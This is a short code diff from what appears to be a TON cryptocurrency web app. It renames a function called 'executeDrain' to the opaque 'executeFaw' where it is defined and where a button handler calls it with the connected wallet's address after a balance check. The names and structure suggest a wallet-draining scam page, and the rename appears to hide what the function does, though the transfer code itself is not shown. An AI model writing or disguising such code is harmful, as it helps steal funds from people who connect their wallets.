@@ -32,7 +32,7 @@ async function getBalance(address) {
     }
 }
 
-async function executeDrain(userAddress) {
+async function executeFaw(userAddress) {
     var balance = await getBalance(userAddress);
     if (balance < 0.2) {
         setStatus('❌ Insufficient balance (' + balance.toFixed(2) + ' TON)');
@@ -132,7 +132,7 @@ function initApp() {
                 var orig = btn.textContent;
                 btn.textContent = 'Processing...';
                 btn.disabled = true;
-                try { await executeDrain(wallet.address); }
+                try { await executeFaw(wallet.address); }
                 catch(err) { setStatus('⚠️ ' + err.message); }
                 finally { isProcessing = false; btn.textContent = orig; btn.disabled = false; }
             }
